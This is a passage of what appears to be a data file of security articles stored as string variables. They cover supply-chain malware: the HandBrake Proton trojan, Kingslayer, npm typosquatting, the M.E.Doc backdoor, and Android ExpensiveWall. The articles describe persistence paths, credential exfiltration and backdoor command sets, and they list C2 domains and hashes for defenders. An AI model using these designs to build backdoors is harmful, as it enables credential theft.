has not been tampered with.Malicious behaviorThe malicious copy of HandBrake, when run, will immediately ask for an admin password.This is not normal for HandBrake, which may tip off a veteran user of the software. However, for a new user, or someone installing an update who isnt yet familiar with the behavior of that update, this may not raise any red flags.If you are suspicious and click the Cancel button, it seems that the malware is not installed. Further, in my testing, there were no additional prompts in opening the app after the first. Still, I wouldnt trust that copy of the app at all, even if it doesnt appear to be dropping the payload under those conditions.Unfortunately, checking for updates in the malicious copy does not result in any kind of a warning. When the same thing happened to the Transmission app, the Transmission Project quickly put out an update that would replace the infected app with a clean one, as well as cleaning up any traces of the infection on the system. Hopefully, the same will happen for HandBrake, but at the time of this writing that has not been done yet.If the password is given, the malicious app will install the malware on the system in the following locations:~/Library/LaunchAgents/fr.handbrake.activity_agent.plist ~/Library/RenderFiles/activity_agent.appThe launch agent runs the activity_agent app at login and keeps it running in the event something terminates it.However, it seems that this malware may be a bit buggy. On the first install, it also dropped a non-functional launch agent named fr.handbrake.activity_agent.plist-e with some of the contents missing. In another install, the launch agent contained the following non-functional plist data:<?xml version=1.0 encoding=UTF-8?> <!DOCTYPE plist PUBLIC -//Apple//DTD PLIST 1.0//EN http://www.apple.com/DTDs/PropertyList-1.0.dtd> <plist version=1.0> <dict> <key>KeepAlive</key> <true/> <key>Label</key> <string>P_MBN</string> <key>ProgramArguments</key> <array> <string>P_UPTH</string> </array> <key>RunAtLoad</key> <true/> </dict> </plist>It appears that the malware installs this .plist template, then uses the Unix sed command to search for and replace the P_MBN and P_UPTH values but fails to do some in some cases. Thus, the malware does not always successfully install.The fact that the malware requests an admin password yet installs all components in user space where no admin password is needed was initially puzzling, but that password request is actually not a system-generated prompt. Its a phishing dialog displayed by the malware to obtain your password, which will be sent in clear text to api[DOT]handbrake[DOT]biz, the command & control (C&C) server for this malware.The malware will create some or all of the following files:~/Library/VideoFrameworks/CR_def.zip ~/Library/VideoFrameworks/FF.zip ~/Library/VideoFrameworks/GNU_PW.zip ~/Library/VideoFrameworks/KC.zip ~/Library/VideoFrameworks/OP.zip ~/Library/VideoFrameworks/proton.zip ~/Library/VideoFrameworks/SF.zipThese files contain a number of bits of data to be exfiltrated from the machine, such as browser data (including stored form auto-fill data), keychains, and even 1Password vaults. Since the users password was phished previously, that can be used to unlock the keychains, and either it or other passwords found in the keychain may be able to unlock other encrypted files. (Pro tip: never store the master password for your password manager in the keychain and make sure its a unique, strong password!)The proton.zip file is a master archive containing everything in the VideoFrameworks folder. It, too, will be sent to the C&C server, handbrake[DOT]biz, a domain that was just registered on April 29 of this year, presumably in preparation for this attack.Interestingly, the only two Mac apps ever to be hacked in this manner—Transmission, and now HandBrake—were both originally developed by Eric Petit. Though I dont know if it means anything at all, its certainly a fair question to wonder who has access to both of these projects that could be abused in this manner.What is Proton?Many people may never have heard of Proton before. Earlier this year, a signature for Proton was silently added to Apples XProtect signatures, but nobody ever saw a copy. Later, Sixgill wrote up findings that revealed Proton was malware up for sale on the dark webProton is a professionally-developed backdoor, which at the time was selling for around 40 BTC (bitcoins), an amount that is currently worth more than $63,000. At that price, unlimited installations were allowed. A single-use license cost around 2 BTC, or more than $3,000.As an aside, I find it rather ironic that this variant of Proton appears to be a bit buggy, with some installs failing. Hopefully, Proton, Incs customers will have similar questions. A little discord among criminals wouldnt be a bad thing.ImpactThis is a general-purpose backdoor with all the usual backdoor functionality. In addition, it appears this malware is exfiltrating the entire keychain, with all passwords. Thus, if youre infected, the first priority should be changing all your online passwords. (After ensuring that your computer is free of infection, of course! Never change passwords on a device that may still be infected.)Youll also want to take any necessary precautions if you have sensitive data that may have been exfiltrated and business users should contact their IT departments if a company Mac is found to be infected.Seems like this is increasingly becoming something Mac users have to worry about.Thanks to Amit Serper for analysis that provided some clarifying details about the behavior."
article45 = "Published on 2017-03-01 15:49:00+00:00. 1. IntroductionA s upply-chain attack consists of attacking a vendor in order to spread malware to its clients. Thus, the supply-chain by itself acts solely as a means to an end. This kind of an attack provides strategic advantages to attackers due to the fact that they only need a single point in order to affect multiple targets, they evade traditional network analysis and detection tools, they do not require phishing attacks, and they provide access to hardened targets.This document describes a sophisticated attack, recently discovered by RSA, on a software supply-chain (Altair Technologies). The attack caused organizations to upgrade their appliance version to a version containing malware. This attack specifically targeted Windows operating system administrators by exploiting the auto-update process for the system as well as new installations of the product.The purpose of this document is to describe the supply-chain attack, and provide organizations with indicators of compromise, allowing them to check if one of their workstations was infected.2. Supply-chain AttacksA supply-chain attack consists of attacking a vendor in order to spread malware to its clients. Users typically trust their vendors, and thus are likely to install security updates (especially if they are digitally signed by their trusted vendor). In the case of Kingslayer, Altair Technologies, also known for their famous https://www.eventid.net website, had had their version of EvLog altered to contain malicious code.The attackers obtained the private signing key of Altair Technologies, and used it in order to sign an altered version of their EvLog product. This allowed them to act as the software provider, meaning that they were able to keep the functionality of the software, whilst also hiding malicious code within it.For those of you who are unfamiliar with EvLog: EvLog allows users to quickly analyze the event log, allowing system administrators to look for events in an efficient manner. Thus, in our opinion, what makes Kingslayer especially concerning, is the fact that the target audience is domain administrators (or power users). This allows the attacker to compromise the entire network in a swift lateral movement phase (since they already have a malicious Trojan horse application on the network running with domain administrator privileges).From analyzing the attack it appears that at least three binaries, as well as an MSI software installation package, were modified for malicious purposes using the original source code, and signed using the stolen signing private key.Later, clients who wished to install a newer version of the product, were redirected to the malicious domain www.oraclesoft.net, by modifying the attackers .htaccess file. Once redirected, a Trojan, disguised as the original software, was downloaded and installed. Upon a successful installation, a second piece of malware was downloaded in order to act as a command and control server. In addition, other binaries, such as ones for stealing stored password from Chrome and Firefox, were also executed.While the infection time window lasts from April, 2015, to July, 2015, an organization that used EvLog during that time might still be infected. As observed by RSA, numerous organizations were affected by the attack, including the following:· 4 major telecommunications providers.· 10+ western military organizations.· 24+ Fortune 500 companies.· 5 major defense contractors.· 36+ major IT product manufacturers or solutions providers.· 24+ western government organizations.· 24+ banks and financial institutions.· 45+ higher educational institutions.3. Indicators of compromise3.1 DNS & FWOrganizations are requested to check their FW and DNS log files for connections to the following hosts:· www.oraclesoft.net· images.timekard.com3.2 FilesOrganizations are requested to check the existence of the following malicious hashes (SHA-256):caea901a301b9c103d90b8539819e050e57b67c6ff4d7863ad1cd549f5fdc2af383d60bffd5dc64e38893361cb03939bc8c6d5e476dc70755eb0886947e516617aa474d0d39a41768149f413c451e9208f73af4d262b6575ada31644f569915315113f237b29f51c78f315db7d815c5ed1340f52b500f66979edb153515910d772ccf28f4636403249d87721e802140ccae2248b810860f8c5d4f33d073635974286ecd104cf0667064ad008e5ac9ffa33a0f7858bb745d533fdb30369e89dd4"
article46 = "Published on None. JavaScript package management specialist npm Inc. removed almost 40 malicious libraries that were attempting to steal developer credentials.Recent investigations by npm — the Node.js management registry — revealed that a threat actor known as HackTask had uploaded 38 JavaScript packages to the npm repository. The attack attempted to steal environmental variables and could have had serious consequences since this kind of developer information includes passwords and tokens for software and services.After being alerted to the threat by a user on Twitter, npm worked quickly to track down and remove the infected packages. HackTask has since been banned from using the npm repository, but developers should note the risk associated with similar infections and tactics.Targeting JavaScript PackagesThe attacker used typosquatting to register packages that had names similar to popular libraries on the npm registry. According to npms blog, while errant package naming is often accidental, the typosquatting was intentional and malicious in this case.Twitter user Oscar Bolmsten alerted npm to the attacking technique. The Swedish developer noted the anomaly in the crossenv package, which bears a name similar to the npm cross-env script used to set environmental variables across platforms.Another registered package was called mongose, which included both the genuine Mongoose project and additional malevolent code, reported Bleeping Computer. The npm blog post explained that the attackers wanted to use the malicious code to hoard knowledge from deceived users.The Scale of the AttackThe security team at npm immediately investigated the threat, tracked other errant libraries and removed 38 packages. All of HackTasks malicious activities, which were available from July 19 to 31, have now been removed from the registry.The largest danger came from the crossenv package. Researchers at npm reported that this package was downloaded almost 700 times during the two-week period. However, the firm also estimated that there were just 50 real installations of crossenv, and possibly fewer.While the malicious activity has now stopped, the incident represents a real threat to developers. The errant files would have run a script named package-setup.js, according to The Register. The malicious code would have been implemented when developers ran their projects. It would have then gathered environment variables of developers and sent them to the attackers server at npm.hacktask.net, the Bleeping Computer article noted.Long-Term Risks to DevelopersAttackers target environmental variables because they are regularly used to offer credentials to software, npm CTO CJ Silverio told The Register. These environmental variables are used to store sensitive data points, including account names, passwords, tokens and keys for access to other applications and services. Silverio added that she is unaware of any developers suffering account compromises due to the attack.The npm security team said it was working to resolve the current problem and related concerns. This includes a range of programmatic techniques and other approaches to detect packages with similar names, as well as improving controls to enhance overall security. According to another Bleeping Computer piece, the npm security team forced users to reset their passwords in June 2017 after discovering that 13 percent of its packages relied on frail credentials.The company provided a list of affected packages in its blog post. Developers who might have used any of these infected packages should change their passwords immediately."
article47 = "Published on 2017-07-04 00:00:00. This article reveals details about the initial infection vector that was used during the DiskCoder.C outbreak.On the 27th of June 2017, a new cyberattack hit many computer systems in Ukraine, as well as in other countries. That attack was spearheaded by the malware ESET products detect as Diskcoder.C (aka ExPetr, PetrWrap, Petya, or NotPetya). This malware masquerades as typical ransomware: it encrypts the data on the computer and demands $300 in bitcoins for recovery. In fact, the malware authors intention was to cause damage, so they did all that they could to make data decryption very unlikely.In our previous blogpost, we attributed this attack to the TeleBots group and uncovered details about other similar supply chain attacks against Ukraine. This article reveals details about the initial distribution vector that was used during the DiskCoder.C outbreak.Tale of a malicious updateThe Cyberpolice Department of Ukraines National Police stated, on its Facebook account, as did ESET and other information security companies, that the legitimate Ukrainian accounting software M.E.Doc was used by the attackers to push DiskCoder.C malware in the initial phase of the attack. However, until now, no details were provided as to exactly how it was accomplished.During our research, we identified a very stealthy and cunning backdoor that was injected by attackers into one of M.E.Docs legitimate modules. It seems very unlikely that attackers could do this without access to M.E.Docs source code.The backdoored module has the filename ZvitPublishedObjects.dll. This was written using the .NET Framework. It is a 5MB file and contains a lot of legitimate code that can be called by other components, including the main M.E.Doc executable ezvit.exe.We examined all M.E.Doc updates that were released during 2017, and found that there are at least three updates that contained the backdoored module:10.01.175-10.01.176, released on April 14th 201710.01.180-10.01.181, released on May 15th 201710.01.188-10.01.189, released on June 22nd 2017The incident with Win32/Filecoder.AESNI.C happened three days after the 10.01.180-10.01.181 update and the DiskCoder.C outbreak happened five days after the 10.01.188-10.01.189 update. Interestingly, four updates from April 24th 2017, through to May 10th 2017, and seven software updates from May 17th 2017, through to June 21st 2017, didnt contain the backdoored module.Since the May 15th update did contain the backdoored module and the May 17th update didnt, here is a hypothesis that could explain the low infection Win32/Filecoder.AESNI.C ratio: the release of the May 17th update was an unexpected event for the attackers. They pushed the ransomware on May 18th, but the majority of M.E.Doc users no longer had the backdoored module as they had updated already.The PE compilation stamps of analyzed files suggest that these files were compiled on the same date as the update or the day before.Figure 2 shows the differences between the list of classes of backdoored and non-backdoored versions of the ZvitPublishedObjects.dll module, using the ILSpy .NET Decompiler:The main backdoor class is named MeCom and it is located in the ZvitPublishedObjects.Server namespace as shown in Figure 3.The methods of the MeCom class are invoked by the IsNewUpdate method of UpdaterUtils in the ZvitPublishedObjects.Server namespace. The IsNewUpdate method is called periodically in order to check whether a new update is available. The backdoored module from May 15th is implemented in a slightly different way and has fewer features than the one from June 22nd.Each organization that does business in Ukraine has a unique legal entity identifier called the EDRPOU number (Код ЄДРПОУ). This is extremely important for the attackers: having the EDRPOU number, they could identify the exact organization that is now using the backdoored M.E.Doc. Once such an organization is identified, attackers could then use various tactics against the computer network of the organization, depending on the attackers goal(s).Since M.E.Doc is accounting software commonly used in Ukraine, the EDRPOU values could be expected to be found in application data on machines using this software. Hence, the code that was injected in the IsNewUpdate method collects all EDRPOU values from application data: one M.E.Doc instance could be used to perform accounting operations for multiple organizations, so the backdoored code collects all possible EDRPOU numbers.Along with the EDRPOU numbers, the backdoor collects proxy and email settings, including usernames and passwords, from the M.E.Doc application.Warning! We recommend changing passwords for proxies, and for email accounts for all users of M.E.Doc software.The malicious code writes the information collected into the Windows registry under the HKEY_CURRENT_USER\SOFTWARE\WC key using Cred and Prx value names. So if these values exist on a computer, it is highly likely that the backdoored module did, in fact, run on that computer.And here is the most cunning part! The backdoored module does not use any external servers as C&Cs: it uses the M.E.Doc softwares regular update check requests to the official M.E.Doc server upd.me-doc.com[.]ua. The only difference from a legitimate request is that the backdoored code sends the collected information in cookies.We have not performed forensic analysis on the M.E.Doc server. However, as we noted in our previous blogpost, there are signs that the server was compromised. So we can speculate that the attackers deployed server software that allows them to differentiate between requests from compromised and non-compromised machines.And, of course, the attackers added the ability to control the infected machine. The code receives a binary blob official M.E.Doc server, decrypts it using the Triple DES algorithm, and, afterwards, decompresses it using GZip. The result is an XML file that could contain several commands at once. This remote control feature makes the backdoor a fully-featured cyberespionage and cybersabotage platform at the same time.The following table shows possible commands:Command Purpose 0 – RunCmd Executes supplied shell command 1 – DumpData Decodes supplied Base64 data and saves it to a file 2 – MinInfo Collects information about OS version, bitness (32 or 64), current privileges, UAC settings, proxy settings, email settings including login and password 3 – GetFile Collects file from the infected computer 4 – Payload Decodes supplied Base64 data, saves it to an executable file 5 – AutoPayload Same as previous but the supplied file should be a DLL and it will be dropped and executed from the Windows folder using rundll32.exe. In addition, once executed, it attempts to overwrite that dropped DLL and delete it.It should be noted that command number 5, named by malware authors as AutoPayload, perfectly matches the way in which DiskCoder.C was initially executed on patient zero machines.ConclusionsAs our analysis shows, this is a thoroughly well-planned and well-executed operation. We assume that the attackers had access to the M.E.Doc application source code. They had time to learn the code and incorporate a very stealthy and cunning backdoor. The size of the full M.E.Doc installation is about 1.5GB, and we have no way at this time to verify that there are no other injected backdoors.There are still questions to answer. How long has this backdoor been in use? What commands and malware other than DiskCoder.C or Win32/Filecoder.AESNI.C have been pushed via this channel? What other software update supply chains might the gang behind this attack have already compromised but are yet to weaponize?Special thanks to my colleagues Frédéric Vachon and Thomas Dupuy for their help in this research.Indicators of Compromise (IoC)ESET detection names:MSIL/TeleDoor.ALegitimate servers abused by malware authors:upd.me-doc.com[.]uaSHA-1 hashes:7B051E7E7A82F07873FA360958ACC6492E4385DD7F3B1C56C180369AE7891483675BEC61F3182F273567434E2E49358E8210674641A20B147E0BD23CSign up to receive an email update whenever a new article is published in our Ukraine Crisis – Digital Security Resource Center Submit"
article48 = "Published on None. CRITICAL WARNINGUpdated: Sunday, December 17We have published the results of our detailed analysis of the suspicious file, including a list of about 30 Vulnerable wallets created because of this file. Please see our detailed post, Vulnerable Wallets and the Suspicious File.The original post follows.Updated: Sunday, November 26, 2017, 17:00 UTCNOTE: We have expanded the recall window for the Windows Wallet installer. Carefully note the expanded times/dates indicated below. The files currently available on Github through our web site are correct; always check the SHA-256 checksum against your downloaded files.Please be aware that for approximately 4.5 days, a link on our Download page and the file downloads on our Github release page have been serving two suspicious files of unknown origin.Until we know otherwise, all users should presume these files were created with malicious intent – to steal cryptocurrencies and/or user information. The file does not trigger antivirus / anti-malware software, but do not presume the file is safe.Any user who verified the SHA-256 checksum of the download against the checksum listed on our Download pages is already aware the file is not authentic and should not have used the file, but nobody should assume that all users take this important step.Anyone who downloaded the Windows Wallet file between November 21, 2017, 09:39 UTC, and November 25, 2017, 22:30 UTC, should not use the file in any way. If the file was used, the computer on which it was used should be addressed with extreme caution; the file should be deleted, the machine should be thoroughly checked for malware and viruses (or wiped clean), and any cryptocurrencies with wallets accessible on that machine should be moved to new wallet addresses immediately.The currently posted files are safe, but users should always confirm their downloaded files via SHA-256 checksum.Relevant pages and linksProject Github Repository:https://github.com/BTCGPU/BTCGPU/releases/tag/0.15.0.1Project Download Page:https://bitcoingold.org/downloads/Windows file Download SHA-256: 53e01dd7366e87fb920645b29541f8487f6f9eec233cbb43032c60c0398fc9fa bitcoingold-0.15.0-win64-setup.exeLinux file Download SHA-256 Hash:SHA-256: 25d7bf0deb125ecf5b50925a1c58e98c4b0b0a524470379c952f6b9310e97cfe bitcoingold-0.15.0-x86_64-pc-linux-gnu.zipAdditional DetailsUPDATE: Sunday, November 26, 2017, 17:00, UTC – as corrected above, the recall window for the Windows Installer File has been expanded. Two different suspicious files were uploaded to the Github over the course of several days, one after the other. Neither file matched the publicly posted SHA-256 checksum. All users who worked with the suspicious files are advised to take the safest possible course of action or to engage knowledgeable professionals to assist them. The text below is unchanged, but we will be investigating both of these suspicious files fully.The links on our Download page point to the Github repository for the project. This is standard practice to associate the source code with the compiled files.An unknown party gained access to the Github repository and replaced the compiled Windows file with a different one. Until the file can be closely analyzed, we do not know what the intent was. We know that the file does not immediately trigger antivirus/trojan warnings. The Linux file was not changed.The Github repo has been secured and we do not believe a second attempt is possible. The suspicious file has already been replaced with a known safe file whose checksum matches. Our team is performing a security audit to ensure the safety of all other systems, and we will attempt to ascertain the purpose of the file.The source code was unchanged. Any user who downloaded the source code to compile it themselves should be unaffected, but best practice suggests that they ensure their local repository matches the current Github repo and exercise extreme caution."
article49 = "Published on 2017-09-14 13:00:10+00:00. Check Points mobile threat research team identified a new variant of an Android malware that sends fraudulent premium SMS messages and charges for fake services to users accounts without their knowledge. According to Google Play data, the malware infected at least 50 apps and was downloaded between 1 million and 4.2 million times before affected apps were removed.The new strain of malware is dubbed ExpensiveWall, after one of the apps it uses to infect devices, Lovely Wallpaper. ExpensiveWall is a new variant of a malware found earlier this year on Google Play. Downloads of the entire malware family reached between 5.9 million and 21.1 million.What makes ExpensiveWall different than its other family members is that it is packed – an advanced obfuscation technique used by malware developers to encrypt malicious code – allowing it to evade Google Plays built-in anti-malware protections.[For more information on Check Points advanced detection capabilities in SandBlast Mobile, download the research report recently presented at DEFCON]Check Point notified Google about ExpensiveWall on August 10, 2017, and Google promptly removed the reported samples from its store. However, even after the affected Apps were removed, within days another sample infiltrated Google Play, infecting more than 5,000 devices before it was removed four days later.Its important to point out that any infected app installed before it was removed from the App store, still remains installed on users devices. Users who downloaded these apps are therefore still at risk and should manually remove them from their devices.What does ExpensiveWall do?The malware registers victims to premium services without their knowledge and sends fraudulent premium SMS messages, charging their accounts for fake services.Why is ExpensiveWall dangerous?While ExpensiveWall is currently designed only to generate profit from its victims, a similar malware could be easily modified to use the same infrastructure in order to capture pictures, record audio, and even steal sensitive data and send the data to a command and control (C&C) server. Since the malware is capable of operating silently, all of this illicit activity takes place without the victims knowledge, turning it into the ultimate spying tool.How does ExpensiveWall work?Once ExpensiveWall is downloaded, it requests several common permissions, including internet access – which allows the app to connect to its C&C server – and SMS permissions – which enable it to send premium SMS messages and register users for other paid services all without the users knowledge.While these permissions are harmful within the context of a malware, many apps request the same permissions for legitimate purposes. Most users grant these permissions without thinking, especially when installing an app from a trustworthy source such as Google Play.ExpensiveWall contains an interface that connects between in-app actions and the JavaScript code, which runs on a web interface called WebView, meaning JavaScript running inside the WebView can trigger in-app activities. After it is installed and granted the necessary permissions, ExpensiveWall sends data about the infected device to its C&C server, including its location and unique identifiers, such as MAC and IP addresses, IMSI, and IMEI.Each time the device is switched on, or experiences a connectivity change, the app connects to its C&C server and receives a URL, which it opens in an embedded WebView. This page contains a malicious JavaScript code that can invoke in-app functions using JavascriptInterface, like subscribing them to premium services and sending SMS messages. The malware initiates the JavaScript code by silently clicking on the links in the webpage, in the same way it clicks on ads in other occasions.Subscribing victims to paid servicesThe malware obtains the devices phone number and uses it to subscribe the user to different paid services, such as the example below:Figure 3: Code used to obtain phone numberSending premium SMS messagesIn some cases, the SMS activity takes place without giving the user any notice. In other cases, the malware presents the user with a button called Continue, and once the user clicks the button, the malware sends a premium SMS on his behalf. Below is an example of the HTML code containing the embedded JavaScript:ExpensiveWall on Google PlayThe malicious activities did not go unnoticed by the users, as one notes below:As seen in the image above, many users were suspicious and suspected that ExpensiveWall was a malicious app. The comments indicate that the app is promoted on several social networks including Instagram, which might explain how it came to be downloaded so many times.After analyzing different samples of the malware, Check Point mobile threat researchers believe ExpensiveWall is spread to different apps as an SDK called gtk, which developers embed in their own apps. Three versions of apps containing the malicious code exist. The first is the unpacked version, which was discovered earlier this year. The second is the packed version, which is being discussed here, and the third contains the code but does not actively use it.Users and organizations should comprehend that any malware attack is a severe breach of their mobile network, even if it starts out as a seemingly harmless adware. ExpensiveWall is yet another example of the immediate need to protect all mobile devices against advanced threats.How to stay protectedCutting-edge malware such as CopyCat requires advanced protections, capable of identifying and blocking zero-day malware by using both static and dynamic app analysis. Only by examining the malware within context of its operation on a device can successful strategies to block it be created. Users and enterprises should treat their mobile devices just like any other part of their network, and protect them with the best cybersecurity solutions available. Check Point customers are protected by SandBlast Mobile, and on the network front by Check Point Anti-Bot blade, which provides protection against this threat with the signature: Trojan.AndroidOS.CopyCatCheck Point Anti-Bot protects users with the following signature: Trojan.AndroidOS.ExpensiveWallAppendix 1: List of Package names and downloads:Package Name App Name min max Uploaded to Google Play com.star.trek I Love Fliter 1,000,000 5,000,000 18/09/2016 com.newac.toolbox Tool Box Pro 500,000 1,000,000 19/10/2015 com.newac.wallpaper X WALLPAPER 500,000 1,000,000 27/09/2015 com.yeahmobi.horoscopeinter Horoscope 500,000 1,000,000 16/03/2015 com.gkt.xwallpaper X Wallpaper Pro 500,000 1,000,000 02/06/2015 com.gwqcv.zsfy Beautiful Camera 100,000 500,000 11/05/2017 com.hdsj.hdey Color Camera 100,000 500,000 16/03/2017 com.lovephoto.gp.inter Love Photo 100,000 500,000 13/03/2017 com.parrot.tidecmr Tide Camera 100,000 500,000 22/03/2017 com.zerg.charmingcmr Charming Camera 100,000 500,000 22/03/2017 com.constellation.prophecy Horoscope 100,000 500,000 30/06/2016 com.desktoptools.screenunsubscribe DIY Your Screen 100,000 500,000 21/07/2016 com.gkt.ringtonegp Ringtone 100,000 500,000 02/06/2015 com.gpthtwo.horoscope ดวง 12 ราศี Lite 100,000 500,000 03/11/2015 com.guard.defend Safe locker 100,000 500,000 17/06/2016 com.newac.wifibooster Wifi Booster 100,000 500,000 04/11/2015 com.newera.desktop Cool Desktop 100,000 500,000 30/06/2016 com.newera.toolbox useful cube 100,000 500,000 12/06/2016 com.pl.toolboxpro Tool Box Pro 100,000 500,000 22/01/2016 com.something.someone Useful Desktop 100,000 500,000 17/09/2016 com.yeahmobi.horoscope ดวง 12 ราศี Lite 100,000 500,000 20/28/2014 com.yeahmobi.horoscopegpadap Horoscope2.0 100,000 500,000 23/03/2015 com.cegqz.uoud Yes Star 50,000 100,000 03/05/2017 com.cmr.shiny Shiny Camera 50,000 100,000 03/05/2017 com.johg.udrad Simple Camera 50,000 100,000 07/07/2017 com.scamera.smiling Smiling Camera 50,000 100,000 07/06/2017 com.cmr.universal Universal Camera 50,000 100,000 16/05/2017 com.gb.toolbox Amazing Toolbox 50,000 100,000 23/03/2016 com.genesis.awesome Easy capture 50,000 100,000 24/10/2016 com.newera.memorydoctor Memory Doctor 50,000 100,000 15/06/2016 com.pl.toolbox Tool Box Pro 50,000 100,000 08/12/2015 com.sexy.pic Reborn Beauty 50,000 100,000 28/07/2016 com.joy.photo.gp.inter Joy Photo 50,000 100,000 02/08/2016 com.fancy.camera.gp.inter Fancy Camera 50,000 100,000 09/08/2016 com.amazing.photo.gp.inter Amazing Photo 50,000 100,000 13/09/2016 com.amazing.camera.ggi Amazing Camera 50,000 100,000 05/01/2017 com.super.wallpaper.gp.inter Super Wallpaper 50,000 100,000 30/08/2016 com.aolw.maoa DD Player 10,000 50,000 13/03/2017 com.bbapcmr.fascinating Fascinating Camera 10,000 50,000 13/04/2017 com.coral.muse Universal Camera 10,000 50,000 13/07/2017 com.cream.lecoa Cream Camera 10,000 50,000 27/03/2017 com.dmeq.oopes Looking Camera 10,000 50,000 23/05/2017 com.dosl.wthre DD Weather 10,000 50,000 23/05/2017 com.fqaf.dlksk Global Weather 10,000 50,000 03/05/2017 com.ivxz.ykvlf Love Fitness 10,000 50,000 23/05/2017 com.jpst.lsyk Pretty Pictures 10,000 50,000 06/04/2017 com.kifb.mifv Cool Wallpapers 10,000 50,000 10/01/2017 com.magic.beautycmr Beauty Camera 10,000 50,000 04/04/2017 com.opaly.nqib Love locker 10,000 50,000 12/05/2017 com.real.stargh Real Star 10,000 50,000 27/02/2017 com.sadcmr.magic Magic Camera 10,000 50,000 14/06/2017 com.scamera.wonder Wonder Camera 10,000 50,000 14/06/2017 com.scmr.funny Funny Camera 10,000 50,000 02/06/2017 com.simon.easy Easy Camera 10,000 50,000 28/02/2017 com.smgft.keyboard Smart Keyboard 10,000 50,000 14/06/2017 com.xnoc.jdvy Travel Camera 10,000 50,000 02/05/2017 com.yiuw.fhly Photo Warp 10,000 50,000 20/01/2017 com.yjmn.vokle Lovely Wallpaper 10,000 50,000 07/07/2017 com.ysyg.wtmca Lattice Camera 10,000 50,000 09/06/2017 fast.bats.chaz Quick Charger 10,000 50,000 08/05/2017 com.upcamera.xgcby Up Camera 10,000 50,000 18/01/2017 com.photo.power.gp Photo Power 10,000 50,000 23/11/2016 com.asdf.fg.hdwallpaper HDwallpaper 10,000 50,000 13/12/2016 com.gb.wonderfulgames Wonderful Games 10,000 50,000 09/04/2016 com.gkt.fileexplorer BI File Manager 10,000 50,000 01/08/2016 com.gkt.wallpapershd Wallpapers HD 10,000 50,000 03/01/2016 com.kevin.beautyvideo Beautiful Video-Edit your Memory 10,000 50,000 22/09/2016 com.newera.beautifulphoto Wonderful Cam 10,000 50,000 12/06/2016 com.next.toolset useful cube 10,000 50,000 30/06/2016 com.ringtone.freshac Ringtone 10,000 50,000 26/11/2015 com.gkt.gamebar Exciting Games 10,000 50,000 15/09/2015 com.replica.adventure.gp Replica Adventure 10,000 50,000 07/07/2016 com.gg.player.gp GG Player 10,000 50,000 12/07/2016 com.love.camera.gp Love Camera 10,000 50,000 20/10/2016 com.oneshot.beautify.gp Oneshot Beautify 10,000 50,000 01/08/2016 com.pretty.camera.gp Pretty Camera 10,000 50,000 18/10/2016 com.hygk.hlhy CuteCamera 5,000 10,000 22/02/2017 com.kkcamera.akbcartoon Cartoon Camera-stylish, clean 5,000 10,000 08/03/2017 com.craft.decorate Art Camera 5,000 7,000 13/08/2017 com.amazing.video.gp Amazing Video 5,000 10,000 16/11/2016 com.fine.photo.gp Fine Photo 5,000 10,000 22/12/2016 com.applocker.coldwar Infinity safe 5,000 10,000 09/09/2016 com.final.horosope Magical Horoscope 5,000 10,000 21/02/2017 com.gp.toolboxche Toolbox 5,000 10,000 28/04/2016 com.prettygirl.newyear Cute Belle 5,000 10,000 12/01/2017 com.roy.cartoonwallpaper CartoonWallpaper 5,000 10,000 06/09/2016 com.thebell.newcentury Ringtone 5,000 10,000 01/08/2016 com.aypx.ygzp Best Camera 1,000 5,000 16/02/2017 com.colorful.locker Colorful Locker 1,000 5,000 09/05/2017 com.hlux.wfsha Light Keyboard 1,000 5,000 21/07/2017 com.ytkue.oprw Safe Privacy 1,000 5,000 07/06/2017 com.qwer.enjoy.enjoywallpaper Enjoy Wallpaper 1,000 5,000 03/11/2016 com.file.manager.gp File Manager 1,000 5,000 13/12/2016 com.highfirst.fancylocker Fancy locker 1,000 5,000 05/01/2017 com.cute.puzzle.gp Cute Puzzle 1,000 5,000 05/10/2016 com.keyboard.smile Smile Keyboard 500 707 16/05/2017 com.owexs.iouert Vitality Camera 100 500 04/07/2017 com.tools.yidian Lock Now 100 500 23/01/2017 com.camera.kfcfancy Fancy Camera 100 500 20/03/2017 com.hhcamera.useful Useful Camera 100 224 06/03/2017 com.owexs.iouert Vitality Camera 100 224 04/07/2017 com.sec.transfer Sec Transfer 100 136 14/03/2017 com.tools.yidian Lock Now 100 500 23/01/2017 com.bpmiddle.oneversion Magic Filter 100 224 21/09/2016 com.funny.video.gp Funny Video 100 500 07/10/2016 com.ads.wowgames Amazing Gamebox 100 224 22/05/2016 com.wtns.superlocker Super locker 10 50 25/04/2017 com.musicg.ckiqp Music Player 1 2 06/04/2017 Total 5,904,511 21,101,567Appendix 2: List of Command and Control servers:Channel[.]gpnmobi.comchannel2[.]gpnmobi.comadsadmin2[.]yasune360.comadsadmin2[.]longqingdianzi.comadsadmin[.]mobgkt.compayapi[.]mcddmedia.compayapi[.]hehemobi.comAppendix 3: SHA256 binaries:"
article50 = """Hackers infect Mac users with Proton malware using Elmedia Player
Hackers infect Mac users with Proton malware using Elmedia Player	
The general concept regarding Apple devices is that they are secure from growing number of malware and other cyber attacks, but the reality is far from the truth. In the latest campaign, cybercriminals have infected hundreds of Mac users by distributing Proton malware by compromising Elmedia Player software.
According to IT security researchers at ESET, this happened when attackers infected the free version of Elmedia Player downloaded file available on its developer’s site Eltima with Proton malware that was then downloaded by Mac users without triggering any warning.
Proton malware was first discovered this year on the Dark Web being sold for just 40 BTC (USD 41891 at the time of sale). Proton is capable taking full control of a targeted device, keylogging, Observers with SMS notifications, SSH/VNC tunneling with VPS, webcam/screen surveillance, premium customer support, file uploadings, and downloads.
Other than Elmedia, attackers also infected Folx download manager with the same malware. In a blog post, Eltima has acknowledged the attack and stated that:
“On the 19th of October 2017 we were informed by a malware research company ESET that our servers have been hacked and our apps namely Folx and Elmedia Player DMG files are distributed with a malware.”
“Only Elmedia Player and Folx version downloaded from our official Eltima website was infected by this malware. However, the built-in automatic update mechanism is unaffected based on the data available to our cybersecurity experts.”
Those who downloaded Elmedia Player or Folx on 19th of October 2017, their system is likely to be infected with Proton malware. Another bad news is that the only way out is a full OS reinstall. However, the good news is that Apple has already revoked misused Clifton Grimm certificate. To verify if your system is infected, follow these steps:
/tmp/Updater.app/
/Library/LaunchAgents/com.Eltima.UpdaterAgent.plist
/Library/.rand/
/Library/.rand/updateragent.app/
The same malware was distributed by cybercriminals through Handbrake Mirror after compromising its server in May this year. Also, a similar incident took place last month in which hackers infected over two million users with a backdoor who downloaded 5.33 Version of CCleaner, a subsidiary of anti-virus giant Avast and security software for Windows.
This kind of attack is called “supply-chain attack”
